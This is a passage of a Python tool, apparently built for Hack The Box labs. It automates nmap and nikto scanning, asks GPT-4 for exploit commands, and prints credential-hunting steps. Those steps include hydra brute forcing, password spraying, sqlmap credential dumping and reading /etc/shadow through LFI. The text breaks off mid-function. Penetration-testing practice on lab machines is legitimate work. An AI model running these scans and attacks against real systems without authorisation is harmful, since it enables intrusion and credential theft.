#!/usr/bin/env python3
"""
HTB Automated Flag Reveal System
Automated network scanning, vulnerability detection, and exploitation
with AI-powered dynamic scanning
"""

import subprocess
import json
import re
import sys
import os
import argparse
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import xml.etree.ElementTree as ET

# Load environment variables from .env file
try:
    from dotenv import load_dotenv
    load_dotenv()  # Load .env file if present
    DOTENV_AVAILABLE = True
except ImportError:
    DOTENV_AVAILABLE = False

# OpenAI integration (optional)
try:
    from openai import OpenAI
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False
    logger = logging.getLogger(__name__)
    logger.debug("OpenAI module not available. Install with: pip install openai")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(f'htb_auto_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class Colors:
    """Terminal colors for output formatting"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class AIAnalyzer:
    """AI-powered analysis of network scan results"""
    
    def __init__(self, api_key: Optional[str] = None, verbose: bool = False):
        self.api_key = api_key or os.getenv('OPENAI_API_KEY')
        self.client = None
        self.enabled = False
        self.verbose = verbose
        
        if OPENAI_AVAILABLE and self.api_key:
            try:
                self.client = OpenAI(api_key=self.api_key)
                self.enabled = True
                logger.info(f"{Colors.OKGREEN}🤖 AI-powered analysis enabled (DEFAULT MODE){Colors.ENDC}")
                logger.info(f"{Colors.OKGREEN}    All phases will be dynamically adjusted based on AI recommendations{Colors.ENDC}")
            except Exception as e:
                logger.warning(f"{Colors.WARNING}AI initialization failed: {e}{Colors.ENDC}")
                logger.warning(f"{Colors.WARNING}Falling back to standard mode. Fix API key to enable AI.{Colors.ENDC}")
        elif not OPENAI_AVAILABLE:
            logger.warning(f"{Colors.WARNING}⚠️  AI libraries not installed. Running in standard mode.{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}    Install with: pip install openai python-dotenv{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}    Or run: ./setup_ai.sh{Colors.ENDC}")
        else:
            logger.warning(f"{Colors.WARNING}⚠️  OPENAI_API_KEY not set. Running in standard mode.{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}    Set API key in .env file or environment variable{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}    See AI_SETUP.md for instructions{Colors.ENDC}")
    
    def analyze_scan_results(self, scan_results: Dict) -> Dict:
        """Analyze scan results and provide intelligent recommendations"""
        if not self.enabled:
            return {'recommendations': [], 'strategy': 'standard', 'priority_ports': []}
        
        try:
            # Prepare scan data for AI analysis
            scan_summary = self._prepare_scan_summary(scan_results)
            
            prompt = f"""You are a penetration testing expert analyzing network scan results.

Scan Results:
{json.dumps(scan_summary, indent=2)}

Based on these results:
1. Identify the most promising attack vectors
2. Suggest specific scanning strategies for each service
3. Prioritize ports/services for deeper investigation
4. Recommend additional nmap scripts or tools to use
5. Identify potential vulnerabilities based on service versions

Provide your response in JSON format:
{{
  "attack_vectors": ["list of potential attack methods"],
  "priority_ports": ["list of port numbers to focus on"],
  "recommended_scans": {{
    "port_number": "specific nmap command or tool recommendation"
  }},
  "vulnerabilities": ["list of potential CVEs or vulnerability types"],
  "strategy": "aggressive/targeted/stealth",
  "reasoning": "brief explanation of recommendations"
}}"""
            
            logger.info(f"{Colors.OKCYAN}🤖 AI analyzing scan results...{Colors.ENDC}")
            
            # Display the prompt being sent to AI
            logger.info(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI PROMPT - Scan Analysis{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}{prompt}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            response = self.client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert penetration tester specializing in HTB machines. Provide concise, actionable security analysis."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=1500
            )
            
            ai_response = response.choices[0].message.content
            
            # Display the AI response
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI RESPONSE - Scan Analysis{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKGREEN}{ai_response}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            # Extract JSON from response (handle markdown code blocks)
            json_match = re.search(r'```(?:json)?\s*({.*?})\s*```', ai_response, re.DOTALL)
            if json_match:
                ai_response = json_match.group(1)
            
            analysis = json.loads(ai_response)
            
            logger.info(f"{Colors.OKGREEN}✓ AI analysis complete{Colors.ENDC}")
            logger.info(f"{Colors.OKBLUE}Strategy: {analysis.get('strategy', 'standard')}{Colors.ENDC}")
            logger.info(f"{Colors.OKBLUE}Reasoning: {analysis.get('reasoning', 'N/A')}{Colors.ENDC}")
            
            return analysis
            
        except json.JSONDecodeError as e:
            logger.warning(f"{Colors.WARNING}Failed to parse AI response: {e}{Colors.ENDC}")
            logger.debug(f"Raw AI response: {ai_response}")
            return {'recommendations': [], 'strategy': 'standard', 'priority_ports': []}
        except Exception as e:
            logger.warning(f"{Colors.WARNING}AI analysis failed: {e}{Colors.ENDC}")
            return {'recommendations': [], 'strategy': 'standard', 'priority_ports': []}
    
    def _prepare_scan_summary(self, scan_results: Dict) -> Dict:
        """Prepare a concise summary of scan results for AI analysis"""
        summary = {
            'host': scan_results.get('host', 'unknown'),
            'os': scan_results.get('os', 'unknown'),
            'ports': []
        }
        
        for port_info in scan_results.get('ports', []):
            port_summary = {
                'port': port_info.get('port'),
                'service': port_info.get('service'),
                'version': port_info.get('version'),
                'extrainfo': port_info.get('extrainfo'),
                'scripts': [s.get('id') for s in port_info.get('scripts', [])]
            }
            summary['ports'].append(port_summary)
        
        return summary
    
    def suggest_exploitation_strategy(self, vulnerabilities: List[Dict], target: str) -> Dict:
        """Get AI recommendations for exploitation strategy"""
        if not self.enabled or not vulnerabilities:
            return {'exploitation_order': [], 'notes': []}
        
        try:
            prompt = f"""You are a penetration testing expert. Based on these detected vulnerabilities, suggest the most effective exploitation strategy:

Target: {target}
Vulnerabilities:
{json.dumps(vulnerabilities, indent=2)}

Provide exploitation strategy in JSON format:
{{
  "exploitation_order": ["ordered list of vulnerabilities to exploit"],
  "commands": ["specific commands or tools to use"],
  "notes": ["important considerations or warnings"],
  "expected_difficulty": "easy/medium/hard"
}}"""
            
            # Display exploitation strategy prompt
            logger.info(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI PROMPT - Exploitation Strategy{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}{prompt}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            response = self.client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert penetration tester. Provide practical exploitation guidance."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=1000
            )
            
            ai_response = response.choices[0].message.content
            
            # Display exploitation strategy response
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI RESPONSE - Exploitation Strategy{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKGREEN}{ai_response}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            json_match = re.search(r'```(?:json)?\s*({.*?})\s*```', ai_response, re.DOTALL)
            if json_match:
                ai_response = json_match.group(1)
            
            strategy = json.loads(ai_response)
            
            # Display parsed strategy in formatted way
            logger.info(f"{Colors.BOLD}📋 Exploitation Strategy Summary:{Colors.ENDC}")
            logger.info(f"{Colors.OKBLUE}Difficulty: {strategy.get('expected_difficulty', 'unknown').upper()}{Colors.ENDC}")
            
            if strategy.get('exploitation_order'):
                logger.info(f"\n{Colors.OKBLUE}Recommended Order:{Colors.ENDC}")
                for idx, step in enumerate(strategy['exploitation_order'], 1):
                    logger.info(f"  {idx}. {step}")
            
            if strategy.get('commands'):
                logger.info(f"\n{Colors.OKBLUE}Suggested Commands:{Colors.ENDC}")
                for cmd in strategy['commands']:
                    logger.info(f"  $ {cmd}")
            
            if strategy.get('notes'):
                logger.info(f"\n{Colors.WARNING}Important Notes:{Colors.ENDC}")
                for note in strategy['notes']:
                    logger.info(f"  ⚠️  {note}")
            
            logger.info("")  # Empty line
            
            return strategy
            
        except Exception as e:
            logger.debug(f"AI exploitation strategy failed: {e}")
            return {'exploitation_order': [], 'notes': []}
    
    def suggest_exploits_for_vulnerability(self, vuln: Dict, target: str) -> Dict:
        """Get specific exploit suggestions for a single vulnerability"""
        if not self.enabled:
            return {'exploits': [], 'tools': [], 'references': []}
        
        try:
            vuln_type = vuln.get('type', 'unknown')
            port = vuln.get('port', 'unknown')
            description = vuln.get('description', '')
            version = vuln.get('version', '')
            
            prompt = f"""You are an expert penetration tester. Suggest specific exploits for this vulnerability:

Target: {target}
Vulnerability Type: {vuln_type}
Port: {port}
Description: {description}
Version: {version}

Provide detailed exploitation recommendations in JSON format:
{{
  "exploits": [
    {{
      "name": "exploit name",
      "type": "metasploit/manual/searchsploit",
      "command": "exact command to run",
      "cve": "CVE number if applicable",
      "success_probability": "high/medium/low",
      "description": "what this exploit does"
    }}
  ],
  "tools": ["recommended tools like nmap, metasploit, searchsploit"],
  "manual_steps": ["step by step manual exploitation if needed"],
  "references": ["useful links or documentation"],
  "cautions": ["warnings or things to be careful about"]
}}"""
            
            # Display prompt
            logger.info(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI PROMPT - Exploit Suggestions for {vuln_type}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKCYAN}{prompt}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            response = self.client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert penetration tester with deep knowledge of CVEs, exploits, and hacking tools."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=2000
            )
            
            ai_response = response.choices[0].message.content
            
            # Display response
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}AI RESPONSE - Exploit Suggestions{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
            logger.info(f"{Colors.OKGREEN}{ai_response}{Colors.ENDC}")
            logger.info(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
            
            json_match = re.search(r'```(?:json)?\s*({.*?})\s*```', ai_response, re.DOTALL)
            if json_match:
                ai_response = json_match.group(1)
            
            exploit_data = json.loads(ai_response)
            
            # Display formatted exploit suggestions
            logger.info(f"{Colors.BOLD}💥 Exploit Suggestions for {vuln_type} (Port {port}):{Colors.ENDC}\n")
            
            if exploit_data.get('exploits'):
                for idx, exploit in enumerate(exploit_data['exploits'], 1):
                    logger.info(f"{Colors.OKGREEN}[Exploit {idx}] {exploit.get('name', 'Unknown')}{Colors.ENDC}")
                    logger.info(f"  Type: {exploit.get('type', 'N/A')}")
                    if exploit.get('cve'):
                        logger.info(f"  CVE: {exploit.get('cve')}")
                    logger.info(f"  Success Probability: {exploit.get('success_probability', 'unknown').upper()}")
                    logger.info(f"  Description: {exploit.get('description', 'N/A')}")
                    if exploit.get('command'):
                        logger.info(f"  Command: {Colors.OKCYAN}{exploit.get('command')}{Colors.ENDC}")
                    logger.info("")
            
            if exploit_data.get('manual_steps'):
                logger.info(f"{Colors.OKBLUE}Manual Exploitation Steps:{Colors.ENDC}")
                for idx, step in enumerate(exploit_data['manual_steps'], 1):
                    logger.info(f"  {idx}. {step}")
                logger.info("")
            
            if exploit_data.get('tools'):
                logger.info(f"{Colors.OKBLUE}Recommended Tools:{Colors.ENDC}")
                for tool in exploit_data['tools']:
                    logger.info(f"  • {tool}")
                logger.info("")
            
            if exploit_data.get('cautions'):
                logger.info(f"{Colors.WARNING}⚠️  Cautions:{Colors.ENDC}")
                for caution in exploit_data['cautions']:
                    logger.info(f"  • {caution}")
                logger.info("")
            
            if exploit_data.get('references'):
                logger.info(f"{Colors.OKCYAN}References:{Colors.ENDC}")
                for ref in exploit_data['references']:
                    logger.info(f"  • {ref}")
                logger.info("")
            
            return exploit_data
            
        except Exception as e:
            logger.warning(f"{Colors.WARNING}Failed to get exploit suggestions: {e}{Colors.ENDC}")
            return {'exploits': [], 'tools': [], 'references': []}


class NetworkScanner:
    """Network scanning functionality using nmap"""
    
    def __init__(self, target: str, ai_analyzer: Optional['AIAnalyzer'] = None):
        self.target = target
        self.scan_results = {}
        self.ai_analyzer = ai_analyzer
        
    def quick_scan(self) -> Dict:
        """Quick scan to discover open ports"""
        logger.info(f"{Colors.OKBLUE}Starting quick port scan on {self.target}{Colors.ENDC}")
        logger.info(f"{Colors.OKBLUE}Scanning top 100 ports (this may take 1-2 minutes)...{Colors.ENDC}")
        
        try:
            cmd = [
                'nmap', '-T4', '-F', '--open',
                '-oX', '/tmp/quick_scan.xml',
                self.target
            ]
            result = subprocess.run(cmd, check=True, capture_output=True, timeout=300, text=True)
            
            if result.stderr:
                logger.debug(f"Quick scan stderr: {result.stderr}")
            
            return self._parse_nmap_xml('/tmp/quick_scan.xml')
        except subprocess.TimeoutExpired:
            logger.error(f"{Colors.FAIL}Quick scan timed out after 5 minutes{Colors.ENDC}")
            logger.error(f"{Colors.FAIL}Target {self.target} may be unreachable or heavily filtered{Colors.ENDC}")
            logger.info(f"{Colors.WARNING}Try: ping {self.target} to verify connectivity{Colors.ENDC}")
            return {}
        except subprocess.CalledProcessError as e:
            logger.error(f"{Colors.FAIL}Quick scan failed with error code {e.returncode}{Colors.ENDC}")
            if e.stderr:
                logger.error(f"{Colors.FAIL}Error details: {e.stderr.decode() if isinstance(e.stderr, bytes) else e.stderr}{Colors.ENDC}")
            logger.info(f"{Colors.WARNING}Check if target is reachable: ping {self.target}{Colors.ENDC}")
            return {}
        except Exception as e:
            logger.error(f"{Colors.FAIL}Quick scan failed: {e}{Colors.ENDC}")
            return {}
    
    def detailed_scan(self, ports: List[int]) -> Dict:
        """Detailed scan on discovered ports with version detection and scripts"""
        if not ports:
            logger.warning("No ports provided for detailed scan")
            return {}
        
        port_list = ','.join(map(str, ports))
        logger.info(f"{Colors.OKBLUE}Running detailed scan on ports: {port_list}{Colors.ENDC}")
        logger.info(f"{Colors.OKBLUE}Progress: Service detection, OS fingerprinting, and vulnerability scripts{Colors.ENDC}")
        logger.info(f"{Colors.OKBLUE}This scan may take 5-10 minutes depending on target responsiveness...{Colors.ENDC}")
        
        try:
            cmd = [
                'nmap', '-sV', '-sC', '-O', '-A',
                '-p', port_list,
                '--script=vuln',
                '-oX', '/tmp/detailed_scan.xml',
                self.target
            ]
            
            logger.info(f"{Colors.OKCYAN}[Progress] Running nmap with service detection and scripts...{Colors.ENDC}")
            result = subprocess.run(cmd, check=True, capture_output=True, timeout=900, text=True)
            
            if result.stderr:
                logger.debug(f"Detailed scan stderr: {result.stderr}")
            
            logger.info(f"{Colors.OKGREEN}[Progress] Detailed scan completed successfully{Colors.ENDC}")
            return self._parse_nmap_xml('/tmp/detailed_scan.xml')
            
        except subprocess.TimeoutExpired:
            logger.error(f"{Colors.FAIL}Detailed scan timed out after 15 minutes{Colors.ENDC}")
            logger.warning(f"{Colors.WARNING}Attempting to parse partial results...{Colors.ENDC}")
            
            # Try to parse partial results if XML file exists
            try:
                import os
                if os.path.exists('/tmp/detailed_scan.xml'):
                    logger.info(f"{Colors.OKCYAN}Partial scan results found, parsing available data...{Colors.ENDC}")
                    return self._parse_nmap_xml('/tmp/detailed_scan.xml')
                else:
                    logger.error(f"{Colors.FAIL}No scan results available{Colors.ENDC}")
            except Exception as parse_error:
                logger.error(f"{Colors.FAIL}Could not parse partial results: {parse_error}{Colors.ENDC}")
            
            logger.info(f"{Colors.WARNING}Consider increasing timeout or running manual scan:{Colors.ENDC}")
            logger.info(f"{Colors.WARNING}  nmap -sV -sC -p {port_list} {self.target}{Colors.ENDC}")
            return {}
            
        except subprocess.CalledProcessError as e:
            logger.error(f"{Colors.FAIL}Detailed scan failed with error code {e.returncode}{Colors.ENDC}")
            if e.stderr:
                error_msg = e.stderr.decode() if isinstance(e.stderr, bytes) else e.stderr
                logger.error(f"{Colors.FAIL}Error details: {error_msg}{Colors.ENDC}")
                
                # Provide specific suggestions based on error
                if 'permission denied' in error_msg.lower():
                    logger.info(f"{Colors.WARNING}Try running with sudo: sudo python3 htb_auto_pwn.py -t {self.target}{Colors.ENDC}")
                elif 'host seems down' in error_msg.lower():
                    logger.info(f"{Colors.WARNING}Target may be blocking ICMP. Try: nmap -Pn {self.target}{Colors.ENDC}")
            
            # Try to parse any partial results
            try:
                import os
                if os.path.exists('/tmp/detailed_scan.xml'):
                    logger.info(f"{Colors.OKCYAN}Attempting to parse partial results...{Colors.ENDC}")
                    return self._parse_nmap_xml('/tmp/detailed_scan.xml')
            except:
                pass
            
            return {}
            
        except Exception as e:
            logger.error(f"{Colors.FAIL}Detailed scan failed: {type(e).__name__}: {e}{Colors.ENDC}")
            return {}
    
    def dynamic_targeted_scan(self, ports: List[int], ai_recommendations: Dict) -> Dict:
        """Perform targeted scans based on AI recommendations"""
        if not ports or not ai_recommendations:
            return {}
        
        logger.info(f"{Colors.OKBLUE}🎯 Performing AI-guided targeted scans...{Colors.ENDC}")
        
        strategy = ai_recommendations.get('strategy', 'standard')
        recommended_scans = ai_recommendations.get('recommended_scans', {})
        priority_ports = ai_recommendations.get('priority_ports', [])
        
        # Display AI recommendations
        if priority_ports:
            logger.info(f"{Colors.OKCYAN}Priority ports: {', '.join(map(str, priority_ports))}{Colors.ENDC}")
        
        attack_vectors = ai_recommendations.get('attack_vectors', [])
        if attack_vectors:
            logger.info(f"{Colors.OKCYAN}Identified attack vectors:{Colors.ENDC}")
            for vector in attack_vectors[:3]:  # Show top 3
                logger.info(f"  • {vector}")
        
        # Perform targeted scans on priority ports
        results = {'targeted_scans': {}}
        
        for port in priority_ports:
            if port not in ports:
                continue
            
            port_str = str(port)
            if port_str in recommended_scans:
                logger.info(f"{Colors.OKBLUE}Running targeted scan on port {port}...{Colors.ENDC}")
                
                # Parse the recommendation and execute appropriate scan
                recommendation = recommended_scans[port_str]
                logger.info(f"{Colors.OKCYAN}AI Recommendation: {recommendation}{Colors.ENDC}")
                
                # Execute additional targeted scans based on service
                scan_result = self._execute_targeted_scan(port, recommendation)
                if scan_result:
                    results['targeted_scans'][port] = scan_result
        
        return results
    
    def _execute_targeted_scan(self, port: int, recommendation: str) -> Dict:
        """Execute a specific targeted scan based on AI recommendation"""
        result = {'port': port, 'recommendation': recommendation, 'output': ''}
        
        try:
            # Determine which scripts to run based on the port/service
            scripts = []
            
            if 'ssh' in recommendation.lower():
                scripts = ['ssh-auth-methods', 'ssh2-enum-algos', 'ssh-hostkey']
            elif 'http' in recommendation.lower() or 'web' in recommendation.lower():
                scripts = ['http-enum', 'http-headers', 'http-methods', 'http-robots.txt']
            elif 'smb' in recommendation.lower():
                scripts = ['smb-enum-shares', 'smb-enum-users', 'smb-os-discovery']
            elif 'ftp' in recommendation.lower():
                scripts = ['ftp-anon', 'ftp-bounce']
            elif 'mysql' in recommendation.lower():
                scripts = ['mysql-info', 'mysql-enum']
            
            if scripts:
                script_arg = ','.join(scripts)
                cmd = [
                    'nmap', '-p', str(port),
                    '--script', script_arg,
                    '-sV',
                    self.target
                ]
                
                logger.info(f"{Colors.OKCYAN}Running scripts: {script_arg}{Colors.ENDC}")
                scan_result = subprocess.run(cmd, capture_output=True, timeout=120, text=True)
                result['output'] = scan_result.stdout
                
                logger.info(f"{Colors.OKGREEN}✓ Targeted scan completed for port {port}{Colors.ENDC}")
            
        except subprocess.TimeoutExpired:
            logger.warning(f"{Colors.WARNING}Targeted scan timed out for port {port}{Colors.ENDC}")
        except Exception as e:
            logger.debug(f"Targeted scan failed for port {port}: {e}")
        
        return result
    
    def _parse_nmap_xml(self, xml_file: str) -> Dict:
        """Parse nmap XML output"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            results = {
                'host': self.target,
                'ports': [],
                'os': '',
                'vulnerabilities': []
            }
            
            # Parse ports and services
            for port in root.findall('.//port'):
                port_id = port.get('portid')
                protocol = port.get('protocol')
                state = port.find('state')
                service = port.find('service')
                
                if state is not None and state.get('state') == 'open':
                    port_info = {
                        'port': int(port_id),
                        'protocol': protocol,
                        'service': service.get('name', '') if service is not None else '',
                        'version': service.get('product', '') if service is not None else '',
                        'extrainfo': service.get('extrainfo', '') if service is not None else '',
                        'scripts': []
                    }
                    
                    # Parse script output
                    for script in port.findall('script'):
                        script_info = {
                            'id': script.get('id'),
                            'output': script.get('output', '')
                        }
                        port_info['scripts'].append(script_info)
                        
                        # Check for vulnerabilities
                        if 'vuln' in script.get('id', ''):
                            results['vulnerabilities'].append({
                                'port': port_id,
                                'script': script.get('id'),
                                'details': script.get('output', '')
                            })
                    
                    results['ports'].append(port_info)
            
            # Parse OS detection
            for os_match in root.findall('.//osmatch'):
                results['os'] = os_match.get('name', '')
                break
            
            return results
        except Exception as e:
            logger.error(f"Failed to parse nmap XML: {e}")
            return {}


class VulnerabilityDetector:
    """Detect and analyze vulnerabilities"""
    
    def __init__(self, scan_results: Dict):
        self.scan_results = scan_results
        self.vulnerabilities = []
    
    def analyze(self) -> List[Dict]:
        """Analyze scan results for vulnerabilities"""
        logger.info(f"{Colors.OKBLUE}Analyzing for vulnerabilities...{Colors.ENDC}")
        
        # Check nmap vuln scripts
        if 'vulnerabilities' in self.scan_results:
            self.vulnerabilities.extend(self.scan_results['vulnerabilities'])
        
        # Check for common vulnerable services
        for port_info in self.scan_results.get('ports', []):
            service = port_info.get('service', '').lower()
            version = port_info.get('version', '').lower()
            port = port_info.get('port')
            
            # Check for common vulnerabilities
            if 'ftp' in service and port == 21:
                self._check_ftp_anonymous(port)
            elif 'ssh' in service and port == 22:
                self._check_ssh_weaknesses(port, version)
            elif 'http' in service or 'https' in service:
                self._check_web_vulnerabilities(port, service)
            elif 'smb' in service or port in [139, 445]:
                self._check_smb_vulnerabilities(port)
            elif 'mysql' in service or port == 3306:
                self._check_mysql_vulnerabilities(port)
            elif 'postgresql' in service or port == 5432:
                self._check_postgresql_vulnerabilities(port)
        
        return self.vulnerabilities
    
    def _check_ftp_anonymous(self, port: int):
        """Check for anonymous FTP access"""
        logger.info(f"Checking FTP anonymous login on port {port}")
        try:
            result = subprocess.run(
                ['nmap', '--script=ftp-anon', '-p', str(port), self.scan_results['host']],
                capture_output=True, timeout=60, text=True
            )
            if 'Anonymous FTP login allowed' in result.stdout:
                self.vulnerabilities.append({
                    'type': 'ftp_anonymous',
                    'port': port,
                    'severity': 'high',
                    'description': 'Anonymous FTP login enabled'
                })
        except Exception as e:
            logger.debug(f"FTP check failed: {e}")
    
    def _check_ssh_weaknesses(self, port: int, version: str):
        """Check for SSH vulnerabilities"""
        logger.info(f"Checking SSH vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'ssh',
            'port': port,
            'severity': 'medium',
            'description': f'SSH service detected: {version}',
            'version': version
        })
    
    def _check_web_vulnerabilities(self, port: int, service: str):
        """Check for web application vulnerabilities"""
        logger.info(f"Checking web vulnerabilities on port {port}")
        
        # Run nikto scan
        try:
            protocol = 'https' if 'https' in service else 'http'
            url = f"{protocol}://{self.scan_results['host']}:{port}"
            
            result = subprocess.run(
                ['nikto', '-h', url, '-maxtime', '120s'],
                capture_output=True, timeout=150, text=True
            )
            
            if result.stdout:
                self.vulnerabilities.append({
                    'type': 'web',
                    'port': port,
                    'severity': 'medium',
                    'description': 'Web server detected',
                    'nikto_output': result.stdout
                })
        except Exception as e:
            logger.debug(f"Web vulnerability check failed: {e}")
    
    def _check_smb_vulnerabilities(self, port: int):
        """Check for SMB vulnerabilities"""
        logger.info(f"Checking SMB vulnerabilities on port {port}")
        try:
            result = subprocess.run(
                ['nmap', '--script=smb-vuln*', '-p', str(port), self.scan_results['host']],
                capture_output=True, timeout=120, text=True
            )
            
            if 'VULNERABLE' in result.stdout:
                self.vulnerabilities.append({
                    'type': 'smb',
                    'port': port,
                    'severity': 'critical',
                    'description': 'SMB vulnerability detected',
                    'details': result.stdout
                })
        except Exception as e:
            logger.debug(f"SMB check failed: {e}")
    
    def _check_mysql_vulnerabilities(self, port: int):
        """Check for MySQL vulnerabilities"""
        logger.info(f"Checking MySQL vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'mysql',
            'port': port,
            'severity': 'medium',
            'description': 'MySQL service detected'
        })
    
    def _check_postgresql_vulnerabilities(self, port: int):
        """Check for PostgreSQL vulnerabilities"""
        logger.info(f"Checking PostgreSQL vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'postgresql',
            'port': port,
            'severity': 'medium',
            'description': 'PostgreSQL service detected'
        })


class Exploiter:
    """Automated exploitation module"""
    
    def __init__(self, target: str, vulnerabilities: List[Dict], ai_analyzer: Optional['AIAnalyzer'] = None):
        self.target = target
        self.vulnerabilities = vulnerabilities
        self.flags = []
        self.ai_analyzer = ai_analyzer
    
    def exploit(self) -> List[str]:
        """Attempt to exploit discovered vulnerabilities"""
        logger.info(f"{Colors.OKBLUE}Starting exploitation phase...{Colors.ENDC}")
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type')
            port = vuln.get('port')
            
            # Display credential hunting and access options before exploitation
            self._display_credential_hunting_options(vuln)
            self._display_access_methods(vuln)
            
            if vuln_type == 'ftp_anonymous':
                self._exploit_ftp_anonymous(port)
            elif vuln_type == 'ssh':
                self._exploit_ssh(port, vuln)
            elif vuln_type == 'web':
                self._exploit_web(port)
            elif vuln_type == 'smb':
                self._exploit_smb(port)
            
            # Display privilege escalation options after initial access attempt
            self._display_privesc_options(vuln)
        
        return self.flags
    
    def _display_credential_hunting_options(self, vuln: Dict):
        """Display options for finding credentials based on vulnerability type"""
        vuln_type = vuln.get('type')
        port = vuln.get('port')
        
        logger.info(f"\n{Colors.BOLD}🔍 Credential Hunting Options for {vuln_type} (Port {port}):{Colors.ENDC}")
        
        if vuln_type == 'ftp_anonymous':
            logger.info(f"{Colors.OKCYAN}FTP Credential Discovery:{Colors.ENDC}")
            logger.info(f"  • Check for configuration files: .ftpconfig, ftpusers")
            logger.info(f"  • Look for password files in accessible directories")
            logger.info(f"  • Search for backup files: *.bak, *.old, *.backup")
            logger.info(f"  • Check for .ssh directory with private keys")
            logger.info(f"  • Enumerate writable directories for further access")
            logger.info(f"  Command: lftp -u anonymous, {self.target}:{port} -e 'find; quit'")
            
        elif vuln_type == 'ssh':
            logger.info(f"{Colors.OKCYAN}SSH Credential Discovery:{Colors.ENDC}")
            logger.info(f"  • Try default credentials: root/root, admin/admin, user/user")
            logger.info(f"  • Brute force with hydra: hydra -L users.txt -P passwords.txt ssh://{self.target}:{port}")
            logger.info(f"  • Check for SSH keys in web directories or FTP")
            logger.info(f"  • Look for credentials in: config files, environment variables, .bash_history")
            logger.info(f"  • Try username enumeration: ssh-audit, nmap scripts")
            logger.info(f"  • Search public exploits for SSH version: {vuln.get('version', 'unknown')}")
            
        elif vuln_type == 'web':
            logger.info(f"{Colors.OKCYAN}Web Application Credential Discovery:{Colors.ENDC}")
            logger.info(f"  • Check for default admin panels: /admin, /login, /wp-admin, /phpmyadmin")
            logger.info(f"  • Look for exposed credentials in: robots.txt, .git, .env, config.php")
            logger.info(f"  • SQL Injection to dump credentials: sqlmap -u http://{self.target}:{port}")
            logger.info(f"  • Directory bruteforce: gobuster dir -u http://{self.target}:{port} -w wordlist.txt")
            logger.info(f"  • Search for: database backups, phpinfo.php, configuration files")
            logger.info(f"  • Check source code comments for hardcoded credentials")
            logger.info(f"  • Test for LFI to read: /etc/passwd, /etc/shadow, config files")
            logger.info(f"  • Look for user registration/password reset functions")
            
        elif vuln_type == 'smb':
            logger.info(f"{Colors.OKCYAN}SMB Credential Discovery:{Colors.ENDC}")
            logger.info(f"  • Anonymous enumeration: smbclient -L //{self.target} -N")
            logger.info(f"  • Null session: enum4linux -a {self.target}")
            logger.info(f"  • User enumeration: crackmapexec smb {self.target} --users")
            logger.info(f"  • Share enumeration: smbmap -H {self.target}")
            logger.info(f"  • Password spraying: crackmapexec smb {self.target} -u users.txt -p password")
            logger.info(f"  • Look for credentials in accessible shares")
            logger.info(f"  • Check for GPP passwords: Get-GPPPassword.ps1")
            
        elif vuln_type in ['mysql', 'postgresql']:
            logger.info(f"{Colors.OKCYAN}Database Credential Discovery:{Colors.ENDC}")
            logger.info(f"  • Try default credentials: root/root, admin/admin, postgres/postgres")
            logger.info(f"  • Brute force: hydra -L users.txt -P passwords.txt {self.target} {vuln_type}")
            logger.info(f"  • Look for database config files in web directories")
            logger.info(f"  • Check for SQL injection in web applications")
            logger.info(f"  • Search for backup files containing credentials")
        
        # Get AI suggestions for credential hunting
